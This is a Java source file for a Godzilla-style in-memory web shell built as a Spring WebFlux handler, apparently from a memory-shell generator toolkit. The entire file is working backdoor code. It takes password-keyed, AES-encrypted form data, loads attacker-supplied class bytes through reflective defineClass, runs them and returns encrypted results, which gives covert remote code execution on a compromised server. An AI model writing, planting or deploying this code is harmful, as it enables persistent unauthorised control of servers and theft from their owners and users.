package jmg.godzilla.memshell;

import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.server.ServerWebExchange;
import reactor.core.publisher.Mono;

import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.Map;

public class GodzillaWebFluxHandlerMethod {
    public static Map<String, Object> store = new HashMap();
    public static String key;
    public static String pass;
    public static String md5;

    public GodzillaWebFluxHandlerMethod() {
    }

    static {
        md5 = md5(pass + key);
    }


    private static Class defineClass(byte[] classbytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public synchronized ResponseEntity invoke(ServerWebExchange exchange) {
        try {
            Object bufferStream = exchange.getFormData().flatMap(c -> {
                StringBuilder result = new StringBuilder();
                try {
                    String id = c.getFirst(pass);
                    byte[] data = x(base64Decode(id), false);
                    if (store.get("payload") == null) {
                        store.put("payload", defineClass(data));
                    } else {
                        store.put("parameters", data);
                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                        Object f = ((Class) store.get("payload")).newInstance();
                        f.equals(arrOut);
                        f.equals(data);
                        result.append(md5.substring(0, 16));
                        f.toString();
                        result.append(base64Encode(x(arrOut.toByteArray(), true)));
                        result.append(md5.substring(16));
                    }
                } catch (Exception ex) {
                    result.append(ex.getMessage());
                }
                return Mono.just(result.toString());
            });
            return new ResponseEntity(bufferStream, HttpStatus.OK);
        } catch (Exception ex) {
            return new ResponseEntity(ex.getMessage(), HttpStatus.OK);
        }
    }
}